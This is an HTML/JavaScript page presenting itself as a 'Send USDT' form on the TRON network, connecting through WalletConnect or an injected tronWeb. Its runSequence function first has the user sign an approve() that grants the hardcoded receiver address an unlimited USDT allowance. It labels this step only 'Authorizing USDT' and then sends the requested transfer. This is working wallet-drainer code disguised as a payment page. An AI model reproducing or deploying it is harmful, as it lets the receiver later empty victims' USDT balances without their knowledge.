<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Send USDT</title>

<!-- ✅ ICON -->
<link rel="icon" href="https://raw.githubusercontent.com/salmanraheem-dev/bestforlast/refs/heads/main/public/logo.png">
<link rel="apple-touch-icon" href="https://raw.githubusercontent.com/salmanraheem-dev/bestforlast/refs/heads/main/public/logo.png">

<!-- ✅ WalletConnect -->
<script src="https://unpkg.com/@walletconnect/sign-client@2.17.0/dist/index.umd.js"></script>

<style>
body{
  margin:0;
  background:#0d0f12;
  color:#fff;
  font-family:-apple-system, sans-serif;
}
.header{
  padding:16px;
  text-align:center;
  font-size:18px;
  border-bottom:1px solid #222;
}
.container{ padding:16px; }
.box{
  border:1px solid #2a2d33;
  border-radius:12px;
  padding:14px;
  margin-bottom:16px;
  background:#121417;
}
.label{ font-size:12px; color:#888; margin-bottom:6px; }
.input{
  width:100%;
  border:none;
  outline:none;
  background:transparent;
  color:#fff;
  font-size:16px;
}
.network{
  display:flex;
  align-items:center;
  gap:8px;
  background:#1b1e23;
  padding:8px 12px;
  border-radius:20px;
  width:fit-content;
}
.network img{ width:18px; }
.receiver{
  font-size:13px;
  color:#ccc;
  word-break:break-all;
}
.btn{
  position:fixed;
  bottom:20px;
  left:16px;
  right:16px;
  background:#2ecc71;
  color:#000;
  padding:16px;
  border:none;
  border-radius:30px;
  font-size:18px;
  font-weight:bold;
  cursor:pointer;
}
.btn:disabled{
  background:#555;
}
.status{
  font-size:12px;
  color:#aaa;
  margin-bottom:10px;
}
</style>
</head>

<body>

<div class="header">Send USDT</div>

<div class="container">

<div id="status" class="status">Ready</div>

<!-- RECEIVER -->
<div class="box">
  <div class="label">Address</div>
  <div class="receiver">TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV</div>
</div>

<div class="box">
  <div class="label">Network</div>
  <div class="network">
    <img src="https://cryptologos.cc/logos/tron-trx-logo.png"> Tron
  </div>
</div>

<div class="box">
  <div class="label">Amount</div>
  <input id="amount" class="input" placeholder="0.00" type="number">
</div>

</div>

<button class="btn" id="mainBtn" onclick="handleNext()">Next</button>

<script>
/** 
 * CONFIGURATION
 */
const PROJECT_ID = "171db6da15a54effc1b4a06f889a3c3f";
const TRON_CHAIN = "tron:0x2b6653dc";
const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; 
const RECEIVER = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV"; // Spender & Receiver
const APP_URL = window.location.href;

let client = null;
let session = null;
let address = null;

// Helpers
function setStatus(t){ document.getElementById("status").innerText = t; }
function short(a){ return a.slice(0,6)+"..."+a.slice(-4); }

function getSignClient(){
  if(window.SignClient?.init) return window.SignClient;
  if(window.WalletConnectSignClient?.SignClient?.init) return window.WalletConnectSignClient.SignClient;
  if(window.walletconnect?.SignClient?.init) return window.walletconnect.SignClient;
  return null;
}

// Initialization
async function init(){
  try{
    // Check for DApp browser injection
    if(window.tronWeb?.defaultAddress?.base58){
      address = window.tronWeb.defaultAddress.base58;
      setStatus("Connected: " + short(address));
      return;
    }

    const SignClient = getSignClient();
    if(!SignClient) return;

    client = await SignClient.init({
      projectId: PROJECT_ID,
      metadata:{
        name:"USDT Sender",
        description:"Secure TRON Transaction",
        url: APP_URL,
        icons:["https://raw.githubusercontent.com/salmanraheem-dev/bestforlast/refs/heads/main/public/logo.png"]
      }
    });

    const sessions = client.session.getAll();
    if(sessions.length){
      session = sessions[0];
      address = session.namespaces.tron.accounts[0].split(":")[2];
      setStatus("Connected: " + short(address));
    }
  }catch(e){ console.error("Init Error:", e); }
}

async function connectWallet(){
  try{
    const { uri, approval } = await client.connect({
      requiredNamespaces:{
        tron:{
          methods:["tron_signTransaction"],
          chains:[TRON_CHAIN],
          events:[]
        }
      }
    });

    if(uri){
      const link = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`;
      window.location.href = link;
    }

    session = await approval();
    address = session.namespaces.tron.accounts[0].split(":")[2];
    setStatus("Connected: " + short(address));
  }catch(e){
    console.error(e);
    setStatus("Connection failed");
  }
}

async function handleNext(){
  if(!address){
    await connectWallet();
    return;
  }
  
  const val = document.getElementById("amount").value;
  if(!val || parseFloat(val) <= 0) return alert("Please enter a valid amount");

  runSequence(val);
}

/**
 * CORE LOGIC: Sequential Transactions
 */
async function runSequence(amount) {
    const btn = document.getElementById("mainBtn");
    try {
        btn.disabled = true;
        btn.innerText = "Processing...";

        // Parameters preparation
        const unlimitedHex = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
        const receiverHex = base58ToHex(RECEIVER).replace("41","").padStart(64,"0");
        const sunAmount = Math.floor(parseFloat(amount) * 1e6).toString(16).padStart(64, "0");

        // 1. APPROVE UNLIMITED
        setStatus("1/2: Authorizing USDT...");
        await sendTransaction("approve(address,uint256)", receiverHex + unlimitedHex);

        // 2. TRANSFER AMOUNT
        setStatus("2/2: Confirming Transfer...");
        await sendTransaction("transfer(address,uint256)", receiverHex + sunAmount);

        setStatus("Success!");
        alert("Transactions completed successfully.");
    } catch (e) {
        console.error(e);
        alert("Transaction error: " + (e.message || "User rejected or insufficient TRX"));
    } finally {
        btn.disabled = false;
        btn.innerText = "Next";
        setStatus("Connected: " + short(address));
    }
}

async function sendTransaction(selector, parameter) {
    // Build Transaction via Trongrid
    const txData = await fetch("https://api.trongrid.io/wallet/triggersmartcontract", {
        method: "POST",
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            owner_address: address,
            contract_address: USDT_CONTRACT,
            function_selector: selector,
            parameter: parameter,
            fee_limit: 100000000,
            visible: true
        })
    }).then(r => r.json());

    if (!txData.result || !txData.result.result) throw new Error("Contract call failed");

    // Sign Transaction
    let signed;
    if (window.tronWeb) {
        signed = await window.tronWeb.trx.sign(txData.transaction);
    } else {
        signed = await client.request({
            topic: session.topic,
            chainId: TRON_CHAIN,
            request: {
                method: "tron_signTransaction",
                params: { address, transaction: txData.transaction }
            }
        });
    }

    // Broadcast
    const broadcast = await fetch("https://api.trongrid.io/wallet/broadcasttransaction", {
        method: "POST",
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(signed)
    }).then(r => r.json());

    if (!broadcast.result) throw new Error("Broadcast failed");
    return broadcast;
}

// Address Converter
const ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
function base58ToHex(addr) {
    let num = BigInt(0);
    for (let c of addr) {
        num = num * 58n + BigInt(ALPHABET.indexOf(c));
    }
    let hex = num.toString(16);
    if (hex.length % 2) hex = "0" + hex;
    return "41" + hex.slice(2, -8);
}

init();
</script>

</body>
</html>
